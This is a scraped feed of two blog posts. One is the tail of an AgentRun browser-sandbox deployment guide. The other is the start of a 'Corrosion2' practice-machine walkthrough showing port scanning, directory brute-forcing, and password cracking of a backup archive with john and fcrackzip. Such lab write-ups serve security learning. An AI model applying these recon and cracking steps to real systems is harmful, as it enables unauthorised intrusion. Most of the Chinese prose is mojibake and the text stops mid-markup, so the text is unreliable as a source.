id=\"æŒ‰éœ€åˆ›å»ºä¸é”€æ¯\">æŒ‰éœ€åˆ›å»ºä¸é”€æ¯</h3>\n<pre><code class=\"language-python\">class CostOptimizedManager:\n    \"\"\"æˆæœ¬ä¼˜åŒ–çš„ç®¡ç†å™¨\"\"\"\n    \n    def __init__(self, idle_threshold=300):\n        self.idle_threshold = idle_threshold\n        self.sandboxes = {}\n        self.last_used = {}\n    \n    def get_sandbox(self, key: str):\n        \"\"\"è·å– Sandboxï¼ˆæ‡’åŠ è½½ï¼‰\"\"\"\n        if key not in self.sandboxes:\n            self.sandboxes[key] = Sandbox.create(\n                template_type=TemplateType.BROWSER,\n                template_name=os.getenv(\"BROWSER_TEMPLATE_NAME\"),\n                sandbox_idle_timeout_seconds=self.idle_threshold\n            )\n        \n        self.last_used[key] = time.time()\n        return self.sandboxes[key]\n    \n    def cleanup_idle(self):\n        \"\"\"æ¸…ç†é—²ç½® Sandbox\"\"\"\n        current_time = time.time()\n        to_remove = []\n        \n        for key, last_time in self.last_used.items():\n            if current_time - last_time &gt; self.idle_threshold:\n                to_remove.append(key)\n        \n        for key in to_remove:\n            if key in self.sandboxes:\n                self.sandboxes[key].delete()\n                del self.sandboxes[key]\n                del self.last_used[key]\n                logger.info(f\"æ¸…ç†é—²ç½® Sandbox: {key}\")\n</code></pre>\n<h3 id=\"æ‰¹é‡ä»»åŠ¡å¤„ç†\">æ‰¹é‡ä»»åŠ¡å¤„ç†</h3>\n<pre><code class=\"language-python\">async def batch_process_tasks(tasks: List[str], pool_size: int = 5):\n    \"\"\"æ‰¹é‡å¤„ç†ä»»åŠ¡ï¼ˆå¤ç”¨ Sandboxï¼‰\"\"\"\n    pool = SandboxPool(pool_size=pool_size)\n    results = []\n    \n    for task in tasks:\n        sandbox = pool.acquire()\n        try:\n            # å¤„ç†ä»»åŠ¡\n            result = await process_task(sandbox, task)\n            results.append(result)\n        finally:\n            pool.release(sandbox)\n    \n    return results\n</code></pre>\n<h2 id=\"ç”Ÿäº§ç¯å¢ƒéƒ¨ç½²\">ç”Ÿäº§ç¯å¢ƒéƒ¨ç½²</h2>\n<h3 id=\"ç¯å¢ƒé…ç½®\">ç¯å¢ƒé…ç½®</h3>\n<p><strong>å¼€å‘ç¯å¢ƒ (.env.dev)</strong>ï¼š</p>\n<pre><code class=\"language-bash\"># å¼€å‘ç¯å¢ƒé…ç½®\nBROWSER_TEMPLATE_NAME=dev-browser-template\nSANDBOX_IDLE_TIMEOUT=7200\nPOOL_SIZE=2\nLOG_LEVEL=DEBUG\n</code></pre>\n<p><strong>ç”Ÿäº§ç¯å¢ƒ (.env.prod)</strong>ï¼š</p>\n<pre><code class=\"language-bash\"># ç”Ÿäº§ç¯å¢ƒé…ç½®\nBROWSER_TEMPLATE_NAME=prod-browser-template\nSANDBOX_IDLE_TIMEOUT=300\nPOOL_SIZE=10\nLOG_LEVEL=INFO\nENABLE_METRICS=true\nMETRICS_EXPORT_INTERVAL=300\n</code></pre>\n<h3 id=\"é«˜å¯ç”¨æ¶æ„\">é«˜å¯ç”¨æ¶æ„</h3>\n<p><img alt=\"\" class=\"lazyload\" /></p>\n<h3 id=\"å¥åº·æ£€æŸ¥\">å¥åº·æ£€æŸ¥</h3>\n<pre><code class=\"language-python\">from flask import Flask, jsonify\n\napp = Flask(__name__)\nmanager = SandboxManager()\n\n@app.route('/health')\ndef health_check():\n    \"\"\"å¥åº·æ£€æŸ¥ç«¯ç‚¹\"\"\"\n    try:\n        # æ£€æŸ¥ Sandbox æ˜¯å¦å¯ç”¨\n        sandbox = manager.get_or_create()\n        \n        # ç®€å•çš„å¥åº·æ£€æŸ¥\n        is_healthy = hasattr(sandbox, 'sandbox_id')\n        \n        if is_healthy:\n            return jsonify({\n                'status': 'healthy',\n                'sandbox_id': sandbox.sandbox_id,\n                'timestamp': time.time()\n            }), 200\n        else:\n            return jsonify({\n                'status': 'unhealthy',\n                'error': 'Sandbox not available'\n            }), 503\n    except Exception as e:\n        return jsonify({\n            'status': 'unhealthy',\n            'error': str(e)\n        }), 503\n\n@app.route('/metrics')\ndef metrics():\n    \"\"\"æŒ‡æ ‡ç«¯ç‚¹\"\"\"\n    collector = MetricsCollector()\n    # è¿”å›å½“å‰æŒ‡æ ‡\n    return jsonify({\n        'total_sandboxes': len(collector.metrics),\n        'timestamp': time.time()\n    })\n</code></pre>\n<h2 id=\"æ•…éšœæ’æŸ¥ä¸å¸¸è§é—®é¢˜\">æ•…éšœæ’æŸ¥ä¸å¸¸è§é—®é¢˜</h2>\n<h3 id=\"è¿æ¥é—®é¢˜\">è¿æ¥é—®é¢˜</h3>\n<p><strong>é—®é¢˜</strong>ï¼šæ— æ³•è¿æ¥åˆ° Sandbox</p>\n<p><strong>æ’æŸ¥æ­¥éª¤</strong>ï¼š</p>\n<pre><code class=\"language-python\">def diagnose_connection(sandbox):\n    \"\"\"è¯Šæ–­è¿æ¥é—®é¢˜\"\"\"\n    print(f\"1. æ£€æŸ¥ Sandbox ID: {sandbox.sandbox_id}\")\n    print(f\"2. æ£€æŸ¥ CDP URL: {sandbox.cdp_url}\")\n    \n    # æµ‹è¯• CDP è¿æ¥\n    try:\n        with sync_playwright() as p:\n            browser = p.chromium.connect_over_cdp(sandbox.cdp_url)\n            print(\"âœ“ CDP è¿æ¥æˆåŠŸ\")\n            browser.close()\n    except Exception as e:\n        print(f\"âœ— CDP è¿æ¥å¤±è´¥: {e}\")\n    \n    # æµ‹è¯• VNC è¿æ¥\n    print(f\"3. VNC URL: {sandbox.vnc_url}\")\n    print(\"æç¤º: å¯ä»¥åœ¨æµè§ˆå™¨ä¸­æ‰“å¼€ VNC URL æµ‹è¯•è¿æ¥\")\n</code></pre>\n<h3 id=\"è¶…æ—¶é—®é¢˜\">è¶…æ—¶é—®é¢˜</h3>\n<p><strong>é—®é¢˜</strong>ï¼šä»»åŠ¡æ‰§è¡Œè¶…æ—¶</p>\n<p><strong>è§£å†³æ–¹æ¡ˆ</strong>ï¼š</p>\n<pre><code class=\"language-python\">def handle_timeout(sandbox, operation, max_retries=3):\n    \"\"\"å¤„ç†è¶…æ—¶ï¼ˆå¸¦é‡è¯•ï¼‰\"\"\"\n    for attempt in range(max_retries):\n        try:\n            return operation(sandbox, timeout=30000)\n        except TimeoutError:\n            logger.warning(f\"ä»»åŠ¡è¶…æ—¶ï¼ˆå°è¯• {attempt + 1}/{max_retries}ï¼‰\")\n            if attempt == max_retries - 1:\n                # æœ€åä¸€æ¬¡å°è¯•å¤±è´¥ï¼Œé‡å»º Sandbox\n                logger.error(\"å¤šæ¬¡è¶…æ—¶ï¼Œé‡å»º Sandbox\")\n                sandbox.delete()\n                sandbox = Sandbox.create(\n                    template_type=TemplateType.BROWSER,\n                    template_name=os.getenv(\"BROWSER_TEMPLATE_NAME\")\n                )\n                return operation(sandbox, timeout=60000)\n</code></pre>\n<h3 id=\"æ€§èƒ½é—®é¢˜\">æ€§èƒ½é—®é¢˜</h3>\n<p><strong>é—®é¢˜</strong>ï¼šå“åº”é€Ÿåº¦æ…¢</p>\n<p><strong>ä¼˜åŒ–å»ºè®®</strong>ï¼š</p>\n<ol>\n<li><strong>ä½¿ç”¨è¿æ¥æ± </strong>ï¼šé¢„å…ˆåˆ›å»ºå¤šä¸ª Sandbox å®ä¾‹</li>\n<li><strong>å¯ç”¨ keep_alive</strong>ï¼šä¿æŒæµè§ˆå™¨ä¼šè¯ï¼Œé¿å…é‡å¤å»ºç«‹è¿æ¥</li>\n<li><strong>åˆç†è®¾ç½®è¶…æ—¶</strong>ï¼šæ ¹æ®ä»»åŠ¡å¤æ‚åº¦è°ƒæ•´è¶…æ—¶æ—¶é—´</li>\n<li><strong>å¹¶å‘æ§åˆ¶</strong>ï¼šé™åˆ¶å¹¶å‘è¯·æ±‚æ•°ï¼Œé¿å…èµ„æºç«äº‰</li>\n</ol>\n<pre><code class=\"language-python\"># æ€§èƒ½ä¼˜åŒ–é…ç½®ç¤ºä¾‹\nbrowser_session = BrowserSession(\n    cdp_url=sandbox.cdp_url,\n    browser_profile=BrowserProfile(\n        timeout=30000,          # 30ç§’è¶…æ—¶\n        keep_alive=True,        # ä¿æŒè¿æ¥\n        disable_security=False  # ä¿æŒå®‰å…¨æ£€æŸ¥\n    )\n)\n</code></pre>\n<h3 id=\"é”™è¯¯ç å‚è€ƒ\">é”™è¯¯ç å‚è€ƒ</h3>\n<table>\n<thead>\n<tr>\n<th>é”™è¯¯ç </th>\n<th>è¯´æ˜</th>\n<th>è§£å†³æ–¹æ¡ˆ</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><code>ConnectionError</code></td>\n<td>è¿æ¥å¤±è´¥</td>\n<td>æ£€æŸ¥ç½‘ç»œè¿æ¥ï¼ŒéªŒè¯ CDP URL</td>\n</tr>\n<tr>\n<td><code>TimeoutError</code></td>\n<td>æ“ä½œè¶…æ—¶</td>\n<td>å¢åŠ è¶…æ—¶æ—¶é—´ï¼Œæ£€æŸ¥ä»»åŠ¡å¤æ‚åº¦</td>\n</tr>\n<tr>\n<td><code>AuthenticationError</code></td>\n<td>è®¤è¯å¤±è´¥</td>\n<td>éªŒè¯ API Key å’Œè®¿é—®å¯†é’¥</td>\n</tr>\n<tr>\n<td><code>ResourceExhausted</code></td>\n<td>èµ„æºä¸è¶³</td>\n<td>å‡å°‘å¹¶å‘æ•°ï¼Œå¢åŠ èµ„æºé…é¢</td>\n</tr>\n<tr>\n<td><code>InvalidArgument</code></td>\n<td>å‚æ•°é”™è¯¯</td>\n<td>æ£€æŸ¥å‚æ•°æ ¼å¼å’Œæœ‰æ•ˆæ€§</td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"æ€»ç»“\">æ€»ç»“</h2>\n<p>é€šè¿‡æœ¬æŒ‡å—ï¼Œæ‚¨å·²ç»æŒæ¡äº†ï¼š</p>\n<ol>\n<li><strong>BrowserUse é›†æˆ</strong>ï¼šå¦‚ä½•ä½¿ç”¨ BrowserUse æ¡†æ¶å®ç°æ™ºèƒ½æµè§ˆå™¨è‡ªåŠ¨åŒ–</li>\n<li><strong>ç”Ÿå‘½å‘¨æœŸç®¡ç†</strong>ï¼šä¸‰ç§ Sandbox ç®¡ç†æ¨¡å¼çš„é€‰æ‹©å’Œå®ç°</li>\n<li><strong>æ€§èƒ½ä¼˜åŒ–</strong>ï¼šè¶…æ—¶é…ç½®ã€å¤ç”¨ç­–ç•¥ã€é”™è¯¯é‡è¯•æœºåˆ¶</li>\n<li><strong>å®‰å…¨å®è·µ</strong>ï¼šç¯å¢ƒå˜é‡ä¿æŠ¤ã€URL ç™½åå•ã€æ—¥å¿—è„±æ•</li>\n<li><strong>å¯è§‚æµ‹æ€§</strong>ï¼šæ—¥å¿—è®°å½•ã€æŒ‡æ ‡æ”¶é›†ã€ç›‘æ§å‘Šè­¦</li>\n<li><strong>æˆæœ¬ä¼˜åŒ–</strong>ï¼šæŒ‰éœ€åˆ›å»ºã€é—²ç½®æ¸…ç†ã€æ‰¹é‡å¤„ç†</li>\n<li><strong>ç”Ÿäº§éƒ¨ç½²</strong>ï¼šé«˜å¯ç”¨æ¶æ„ã€å¥åº·æ£€æŸ¥ã€æ•…éšœæ’æŸ¥</li>\n</ol>\n<h2 id=\"ç«‹å³ä½“éªŒå‡½æ•°è®¡ç®—-agentrun\">ç«‹å³ä½“éªŒå‡½æ•°è®¡ç®— AgentRun</h2>\n<p>å‡½æ•°è®¡ç®— AgentRun çš„æ— ä»£ç åˆ°é«˜ä»£ç æ¼”è¿›èƒ½åŠ›ï¼Œç°å·²å¼€æ”¾ä½“éªŒï¼š</p>\n<ol>\n<li><strong>å¿«é€Ÿåˆ›å»º</strong>ï¼šè®¿é—®æ§åˆ¶å°ï¼ˆ<a href=\"https://functionai.console.aliyun.com/cn-hangzhou/agent/explore\" rel=\"noopener nofollow\" target=\"_blank\">https://functionai.console.aliyun.com/cn-hangzhou/agent/explore</a>ï¼‰ï¼Œ60ç§’åˆ›å»ºä½ çš„ç¬¬ä¸€ä¸ª Agent</li>\n<li><strong>æ·±åº¦å®šåˆ¶</strong>ï¼šå½“éœ€è¦æ›´å¤æ‚åŠŸèƒ½æ—¶ï¼Œä¸€é”®è½¬æ¢ä¸ºé«˜ä»£ç </li>\n<li><strong>æŒç»­æ¼”è¿›</strong>ï¼šåˆ©ç”¨å‡½æ•°è®¡ç®— AgentRun çš„åŸºç¡€è®¾æ–½èƒ½åŠ›ï¼ŒæŒç»­ä¼˜åŒ–ä½ çš„ Agent</li>\n</ol>\n<p>ä»æƒ³æ³•åˆ°ä¸Šçº¿ï¼Œä»åŸå‹åˆ°ç”Ÿäº§ï¼Œå‡½æ•°è®¡ç®— AgentRun å§‹ç»ˆæ˜¯ä½ æœ€å¥½çš„ä¼™ä¼´ã€‚<strong>æ¬¢è¿åŠ å…¥â€œå‡½æ•°è®¡ç®— AgentRun å®¢æˆ·ç¾¤â€ï¼Œé’‰é’‰ç¾¤å·ï¼š<em>134570017218</em>ã€‚</strong></p>\n<h2 id=\"å¿«é€Ÿäº†è§£å‡½æ•°è®¡ç®—-agentrun\">å¿«é€Ÿäº†è§£å‡½æ•°è®¡ç®— AgentRun</h2>\n<p><strong>ä¸€å¥è¯ä»‹ç»ï¼š</strong><a href=\"https://www.aliyun.com/product/fc/agentrun\" rel=\"noopener nofollow\" target=\"_blank\">å‡½æ•°è®¡ç®— AgentRun</a> æ˜¯ä¸€ä¸ªä»¥é«˜ä»£ç ä¸ºæ ¸å¿ƒçš„ä¸€ç«™å¼ Agentic AI åŸºç¡€è®¾æ–½å¹³å°ã€‚ç§‰æŒç”Ÿæ€å¼€æ”¾å’Œçµæ´»ç»„è£…çš„ç†å¿µï¼Œä¸ºä¼ä¸šçº§ Agent åº”ç”¨æä¾›ä»å¼€å‘ã€éƒ¨ç½²åˆ°è¿ç»´çš„å…¨ç”Ÿå‘½å‘¨æœŸç®¡ç†ã€‚</p>\n\n<p><img alt=\"\" class=\"lazyload\" /></p>\n<p>å‡½æ•°è®¡ç®— AgentRun æ¶æ„å›¾</p>\n<p>AgentRun è¿è¡Œæ—¶åŸºäºé˜¿é‡Œäº‘å‡½æ•°è®¡ç®— FC æ„å»ºï¼Œç»§æ‰¿äº† Serverless è®¡ç®—æè‡´å¼¹æ€§ã€æŒ‰é‡ä»˜è´¹ã€é›¶è¿ç»´çš„æ ¸å¿ƒä¼˜åŠ¿ã€‚é€šè¿‡æ·±åº¦é›†æˆ AgentScopeã€LangChainã€RAGFlowã€Mem0 ç­‰ä¸»æµå¼€æºç”Ÿæ€ã€‚å‡½æ•°è®¡ç®— AgentRun å°† Serverless çš„æè‡´å¼¹æ€§ã€é›¶è¿ç»´å’ŒæŒ‰é‡ä»˜è´¹çš„ç‰¹æ€§ä¸ AI åŸç”Ÿåº”ç”¨åœºæ™¯æ·±åº¦èåˆï¼ŒåŠ©åŠ›ä¼ä¸šå®ç°æˆæœ¬ä¸æ•ˆç‡çš„æè‡´ä¼˜åŒ–ï¼Œ<strong>å¹³å‡ TCO é™ä½ 60%</strong>ã€‚</p>\n<p><strong>è®©å¼€å‘è€…åªéœ€ä¸“æ³¨äº Agent çš„ä¸šåŠ¡é€»è¾‘åˆ›æ–°ï¼Œæ— éœ€å…³å¿ƒåº•å±‚åŸºç¡€è®¾æ–½ï¼Œè®© Agentic AI çœŸæ­£è¿›å…¥ä¼ä¸šç”Ÿäº§ç¯å¢ƒã€‚</strong></p>\n<p><strong>æ¨èé˜…è¯»ï¼š</strong></p>\n<ul>\n<li>é˜…è¯»<a href=\"https://yuque.alibaba-inc.com/agentrun/dxnn5p/rcpbigg7gthpa2u4\" rel=\"noopener nofollow\" target=\"_blank\">ã€Šå¿«é€Ÿä¸Šæ‰‹ï¼šLangChain + AgentRun æµè§ˆå™¨æ²™ç®±æç®€é›†æˆæŒ‡å—ã€‹</a>å¤ä¹ åŸºç¡€é›†æˆå’Œ LangChain é›†æˆ</li>\n<li>æŸ¥çœ‹<a href=\"https://docs.agent.run\" rel=\"noopener nofollow\" target=\"_blank\">å®˜æ–¹æ–‡æ¡£</a>äº†è§£æ›´å¤š AgentRun åŠŸèƒ½</li>\n<li>è®¿é—®<a href=\"https://github.com/devsapp/agentrun-sandbox-demos\" rel=\"noopener nofollow\" target=\"_blank\">ç¤ºä¾‹ä»£ç ä»“åº“</a> è·å–å‚è€ƒä»£ç </li>\n</ul>\n\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-01-20 16:12</span>&nbsp;\n<a href=\"https://www.cnblogs.com/Serverless\">Serverlessç¤¾åŒº</a>&nbsp;\né˜…è¯»(<span id=\"post_view_count\">57</span>)&nbsp;\nè¯„è®º(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">æ”¶è—</a>&nbsp;\n<a href=\"\">ä¸¾æŠ¥</a>\n</div>"
    },
    {
      "title": "Corrosion2é¶æœº",
      "link": "https://www.cnblogs.com/yuell/p/19507210",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/yuell/p/19507210\" id=\"cb_post_title_url\" title=\"å‘å¸ƒäº 2026-01-20 15:45\">\n    <span>Corrosion2é¶æœº</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                <div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<h1 id=\"0x01ä¿¡æ¯æ”¶é›†\">0x01ä¿¡æ¯æ”¶é›†</h1>\n<h2 id=\"11-nmapæ‰«æç«¯å£\">1.1 nmapæ‰«æç«¯å£</h2>\n<p><code>nmap -A -p- -v 192.168.222.134 </code><br />\n<img alt=\"\" src=\"https://gitee.com/there-is-a-large-box/image/raw/master/issue/1767838377647-6d3c9cb4-57cb-47ee-b40c-7a424545c7f0.png\" /></p>\n<pre><code class=\"language-plain\">22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey:\n|   3072 6a:d8:44:60:80:39:7e:f0:2d:08:2f:e5:83:63:f0:70 (RSA)\n|   256 f2:a6:62:d7:e7:6a:94:be:7b:6b:a5:12:69:2e:fe:d7 (ECDSA)\n|_  256 28:e1:0d:04:80:19:be:44:a6:48:73:aa:e8:6a:65:44 (ED25519)\n80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))\n|_http-title: Apache2 Ubuntu Default Page: It works\n|_http-server-header: Apache/2.4.41 (Ubuntu)\n| http-methods:\n|_  Supported Methods: POST OPTIONS HEAD GET\n8080/tcp open  http    Apache Tomcat 9.0.53\n|_http-favicon: Apache Tomcat\n|_http-title: Apache Tomcat/9.0.53\n| http-methods:\n|_  Supported Methods: GET HEAD POST OPTIONS\nDevice type: general purpose\nRunning: Linux 4.X|5.X\nOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5\nOS details: Linux 4.15 - 5.19\nUptime guess: 26.829 days (since Fri Dec 12 14:17:12 2025)\nNetwork Distance: 2 hops\nTCP Sequence Prediction: Difficulty=264 (Good luck!)\nIP ID Sequence Generation: All zeros\n\n</code></pre>\n<p>å¼€æ”¾ç«¯å£ï¼š80ã€8080ã€22</p>\n<p>ä¸»æœºæ“ä½œç³»ç»ŸåŠå…¶æœåŠ¡ï¼šUbuntuã€Apache Tomcatã€OpenSSH 8.2p1 Ubuntu 4ubuntu0.3</p>\n<h2 id=\"12webåŠå…¶ç›®å½•æ‰«æ\">1.2webåŠå…¶ç›®å½•æ‰«æ</h2>\n<p>å¼€æ”¾äº†80ã€8080ç«¯å£åˆ†åˆ«è®¿é—®</p>\n<p>80ç«¯å£</p>\n\n<p><img alt=\"\" src=\"https://gitee.com/there-is-a-large-box/image/raw/master/issue/1767838755910-70b66c83-7e85-45d7-b4cc-f457a1f030ee.png\" /></p>\n<p>ç½‘é¡µæ²¡å¯ç”¨çš„ï¼Œæ‰«ä¸€ä¸‹ç›®å½•</p>\n<p><code>dirsearch -u [http://192.168.222.134/](http://192.168.222.134/) -x 401,404,403</code></p>\n\n<p><img alt=\"\" src=\"https://gitee.com/there-is-a-large-box/image/raw/master/issue/1767838945476-65861ad6-84ee-4493-89ab-a50eb77f6f3e.png\" /></p>\n<p>æ‰«å‡ºæ¥æ²¡æœ‰å•¥å¯ç”¨çš„ä¿¡æ¯</p>\n<p>8080ç«¯å£</p>\n\n<p><img alt=\"\" src=\"https://gitee.com/there-is-a-large-box/image/raw/master/issue/1767839239103-2de01363-9f42-4b8b-8a69-5900b70fa49c.png\" /></p>\n<p>tomcatä¸»é¡µç‰ˆæœ¬ä¸º9.0.53ï¼›æ‰«ä¸€ä¸‹ç›®å½•</p>\n<p><code>dirsearch -u http://192.168.222.134:8080 -x 401,404,403</code>æˆ–è€…<code>ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u [http://192.168.1.9:8080/FUZZ](http://192.168.1.9:8080/FUZZ)</code></p>\n\n<p><img alt=\"\" src=\"https://gitee.com/there-is-a-large-box/image/raw/master/issue/1767839464572-dfc3a25d-2e2a-4d2c-a7db-51cd095d2dd0.png\" /></p>\n<pre><code class=\"language-plain\">[10:30:23] 200 -   33KB - /backup.zip\n[10:30:28] 302 -    0B  - /docs  -&gt;  /docs/\n[10:30:28] 200 -   15KB - /docs/\n[10:30:29] 302 -    0B  - /examples  -&gt;  /examples/\n[10:30:29] 200 -    1KB - /examples/\n[10:30:29] 200 -    1KB - /examples/websocket/index.xhtml\n[10:30:29] 200 -   14KB - /examples/jsp/index.html\n[10:30:29] 200 -    6KB - /examples/servlets/index.html\n[10:30:29] 200 -    1KB - /examples/servlets/servlet/RequestHeaderExample\n[10:30:29] 200 -  658B  - /examples/servlets/servlet/CookieExample\n[10:30:29] 200 -  687B  - /examples/jsp/snp/snoop.jsp\n[10:30:30] 200 -   21KB - /favicon.ico\n[10:30:35] 302 -    0B  - /manager  -&gt;  /manager/\n[10:30:35] 302 -    0B  - /manager/  -&gt;  /manager/html\n[10:30:41] 200 -  153B  - /readme.txt\n</code></pre>\n<h2 id=\"13è´¦å·å°è¯•ç›®å½•è¯¦ç»†ä¿¡æ¯æ”¶é›†\">1.3è´¦å·å°è¯•ï¼Œç›®å½•è¯¦ç»†ä¿¡æ¯æ”¶é›†</h2>\n<p>æŸ¥çœ‹ç›®å½•é‡Œé¢æ‰«æå‡ºæ¥çš„ä¸œè¥¿</p>\n<p><strong>backup.zipï¼Œéœ€è¦å¯†ç è§£å‹</strong></p>\n\n<p><img alt=\"\" src=\"https://gitee.com/there-is-a-large-box/image/raw/master/issue/1767839601898-675f2de0-bfac-4f99-a2d7-c5b188f6d2de.png\" /></p>\n<p><strong>çˆ†ç ´ï¼šçˆ†ç ´å·¥å…·å¯å¤šé€‰fcrackzipã€john</strong></p>\n<p>john:. åŸºæœ¬åŠŸèƒ½<br />\nå“ˆå¸Œçˆ†ç ´ï¼šç ´è§£å­˜å‚¨ä¸ºå“ˆå¸Œå€¼çš„å¯†ç ï¼ˆå¦‚ Linux shadow æ–‡ä»¶ã€Windows NTLM å“ˆå¸Œã€MySQL å¯†ç å“ˆå¸Œç­‰ï¼‰ã€‚<br />\nå­—å…¸æ”»å‡»ï¼šåŸºäºå­—å…¸æ–‡ä»¶å°è¯•å¯†ç ç»„åˆã€‚<br />\næš´åŠ›ç ´è§£ï¼šç”Ÿæˆæ‰€æœ‰å¯èƒ½çš„å­—ç¬¦ç»„åˆï¼ˆå¦‚ a-zã€0-9ã€ç‰¹æ®Šå­—ç¬¦ï¼‰è¿›è¡Œå°è¯•ã€‚<br />\nè§„åˆ™ç ´è§£ï¼šé€šè¿‡è‡ªå®šä¹‰è§„åˆ™ï¼ˆå¦‚å¤§å†™é¦–å­—æ¯ã€åŠ æ•°å­—åç¼€ï¼‰æ‰©å±•å­—å…¸ï¼Œæé«˜ç ´è§£æ•ˆç‡ã€‚<br />\næ”¯æŒçš„å“ˆå¸Œç±»å‹</p>\n<table>\n<thead>\n<tr>\n<th><strong>å“ˆå¸Œç±»å‹ / åœºæ™¯</strong></th>\n<th><strong>å¯¹åº”æ–‡ä»¶ / æ ¼å¼ç¤ºä¾‹</strong></th>\n<th><strong>John è¯†åˆ«æ–¹å¼</strong></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><strong>Linux ç³»ç»Ÿå¯†ç </strong></td>\n<td><strong>/etc/shadow æ–‡ä»¶ï¼ˆæ ¼å¼ï¼š</strong><code>**ç”¨æˆ·å:$id$salt$hash**</code><strong>ï¼‰</strong></td>\n<td><strong>è‡ªåŠ¨è¯†åˆ«ï¼ˆ</strong><code>**$1$**</code>** ä¸º MD5ï¼Œ<strong><code>**$6$**</code></strong> ä¸º SHA-512ï¼‰**</td>\n</tr>\n<tr>\n<td><strong>Windows NTLM å“ˆå¸Œ</strong></td>\n<td><strong>æ ¼å¼ï¼š</strong><code>**LM:NTLM**</code><strong>ï¼ˆç¤ºä¾‹ï¼š</strong><code>**aad3b435b51404ee:5f4dcc3b5aa765d61d8327deb882cf99**</code><strong>ï¼‰</strong></td>\n<td>**æŒ‡å®š **<code>**--format=nt**</code></td>\n</tr>\n<tr>\n<td><strong>MySQL å¯†ç å“ˆå¸Œ</strong></td>\n<td><strong>æ ¼å¼ï¼š</strong><code>***hash**</code><strong>ï¼ˆç¤ºä¾‹ï¼š</strong><code>***A4B6157319038724E3566C818872E067**</code><strong>ï¼‰</strong></td>\n<td>**æŒ‡å®š **<code>**--format=mysql-sha1**</code></td>\n</tr>\n<tr>\n<td><strong>ZIP å‹ç¼©åŒ…å¯†ç </strong></td>\n<td><strong>å‹ç¼©åŒ…æ–‡ä»¶ï¼ˆéœ€å…ˆç”¨ <strong><code>**zip2john**</code></strong> æå–å“ˆå¸Œï¼‰</strong></td>\n<td><strong>é€šè¿‡ <strong><code>**zip2john**</code></strong> ç”Ÿæˆçš„å“ˆå¸Œæ–‡ä»¶è‡ªåŠ¨è¯†åˆ«</strong></td>\n</tr>\n<tr>\n<td><strong>RAR å‹ç¼©åŒ…å¯†ç </strong></td>\n<td><strong>å‹ç¼©åŒ…æ–‡ä»¶ï¼ˆéœ€å…ˆç”¨ <strong><code>**rar2john**</code></strong> æå–å“ˆå¸Œï¼‰</strong></td>\n<td><strong>é€šè¿‡ <strong><code>**rar2john**</code></strong> ç”Ÿæˆçš„å“ˆå¸Œæ–‡ä»¶è‡ªåŠ¨è¯†åˆ«</strong></td>\n</tr>\n<tr>\n<td><strong>SSH ç§é’¥å¯†ç </strong></td>\n<td><strong>id_rsa ç­‰ç§é’¥æ–‡ä»¶ï¼ˆéœ€å…ˆç”¨ <strong><code>**ssh2john**</code></strong> æå–å“ˆå¸Œï¼‰</strong></td>\n<td><strong>é€šè¿‡ <strong><code>**ssh2john**</code></strong> ç”Ÿæˆçš„å“ˆå¸Œæ–‡ä»¶è‡ªåŠ¨è¯†åˆ«</strong></td>\n</tr>\n</tbody>\n</table>\n<p><strong>è¡¥å……è¯´æ˜ä¸è°ƒæ•´ï¼š</strong></p>\n<ol>\n<li>Windows NTLM å“ˆå¸Œï¼šå®é™…å¸¸è§çš„æ ¼å¼ä¸º <code>LM:NTLM</code>ï¼Œç¤ºä¾‹ä¸­å·²ä¿ç•™å†’å·åˆ†éš”ï¼ŒJohn éœ€ä½¿ç”¨ <code>--format=nt</code>ã€‚</li>\n<li>MySQL å¯†ç å“ˆå¸Œï¼šç¤ºä¾‹æ ¼å¼ä¸º <code>*hash</code>ï¼Œå®é™…æ˜¯ <code>mysql_native_password</code> ä½¿ç”¨çš„ SHA1 åŒé‡å“ˆå¸Œï¼ŒJohn ä¸­åº”ä½¿ç”¨ <code>--format=mysql-sha1</code>ã€‚</li>\n<li>ZIP/RAR åŒºåˆ†ï¼š<code>zip2john</code> ä¸ <code>rar2john</code> ä¸ºä¸åŒå·¥å…·ï¼Œå»ºè®®åˆ†å¼€åˆ—å‡ºã€‚</li>\n<li>SSH ç§é’¥ï¼šé€šå¸¸ä½¿ç”¨ <code>ssh2john</code>ï¼ˆå±äº John the Ripper å·¥å…·é›†ï¼‰æå–å“ˆå¸Œåå†è¿›è¡Œç ´è§£ã€‚</li>\n</ol>\n<p><strong>fcrackzipï¼š</strong><code>**&lt;font style=\"color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);\"&gt;Fcrackzip&lt;/font&gt;**</code><strong><font style=\"color: rgba(77, 77, 77, 1);\">æ˜¯ä¸€æ¬¾ä¸“é—¨ç ´è§£</font></strong><code>**&lt;font style=\"color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);\"&gt;zip&lt;/font&gt;**</code><strong><font style=\"color: rgba(77, 77, 77, 1);\">ç±»å‹å‹ç¼©æ–‡ä»¶å¯†ç çš„å·¥å…·ï¼Œå·¥å…·å°å·§æ–¹ä¾¿ã€ç ´è§£é€Ÿåº¦å¿«ï¼Œèƒ½ä½¿ç”¨å­—å…¸å’ŒæŒ‡å®šå­—ç¬¦é›†ç ´è§£ï¼Œé€‚ç”¨äº</font></strong><code>**&lt;font style=\"color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);\"&gt;linuxã€mac osx&lt;/font&gt;**</code><strong><font style=\"color: rgba(77, 77, 77, 1);\"> ç³»ç»Ÿ</font></strong></p>\n<p>å®‰è£…ï¼š<code>sudo apt-get install fcrackzip </code></p>\n<p>å®‰è£…å­—å…¸ï¼š<font style=\"color: rgba(21, 167, 167, 1); background-color: rgba(242, 243, 245, 1);\">rockyou.txtï¼›</font></p>\n<p><font style=\"color: rgba(77, 77, 77, 